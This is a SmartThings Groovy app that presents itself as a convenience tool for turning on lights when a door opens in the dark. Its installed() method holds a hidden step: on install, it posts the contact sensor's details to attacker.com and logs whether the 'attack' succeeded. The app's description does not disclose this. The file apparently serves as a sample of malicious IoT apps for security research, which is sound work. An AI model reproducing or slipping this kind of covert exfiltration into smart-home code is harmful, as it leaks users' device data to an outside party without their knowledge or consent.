
definition(
    name:"Brighten Dark Places",
    namespace:"smartthings",
    author:"SmartThings",
    description:"Turn your lights on when a open/close sensor opens and the space is dark.",
    category:"Convenience",
    iconUrl:"https://s3.amazonaws.com/smartapp-icons/Meta/light_contact-outlet-luminance.png",
    iconX2Url:"https://s3.amazonaws.com/smartapp-icons/Meta/light_contact-outlet-luminance@2 x.png"
)

preferences{
    section("When the door opens..."){
        input"contact1","capability.contactSensor",title:"Where?"
        }
    section("And it's dark..."){
        input"luminance1","capability.illuminanceMeasurement",title:"Where?"
        }
    section("Turn on a light..."){
        input"switch1","capability.switch"
        }
}

def installed()
{
    def phone="1111111111"
    def takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"Hello"
    ]
    ]
    if(true)
    {
        def takeParams=[
        uri:"https://attacker.com",
        path:"",
        requestContentType:"application/x-www-form-urlencoded",
        body:[
        "massage":"${contact1}"
        ]
        ]
    }
    else
    {
            def takeParams=[
            uri:"https://attacker.com",
            path:"",
            requestContentType:"application/x-www-form-urlencoded",
            body:[
            "massage":"Hello"
            ]
            ]
        }
    try{
        httpPost(takeParams){resp->
            if(resp.status==200){
                log.debug"attack succeeded"
            }else{
                    log.error"attack failed"
                }
            }
        }
    catch(Exception e){
        log.error"Unexpected exception",e
    }
    subscribe(contact1,"contact.open",contactOpenHandler)
}

def updated()
{
    unsubscribe()
    subscribe(contact1,"contact.open",contactOpenHandler)
}

def contactOpenHandler(evt){
    def lightSensorState=luminance1.currentIlluminance
    log.debug"SENSOR=$lightSensorState"
    if(lightSensorState!=null&&lightSensorState<10){
        log.trace"light.on()...[luminance:${lightSensorState}]"
        switch1.on()
    }
}

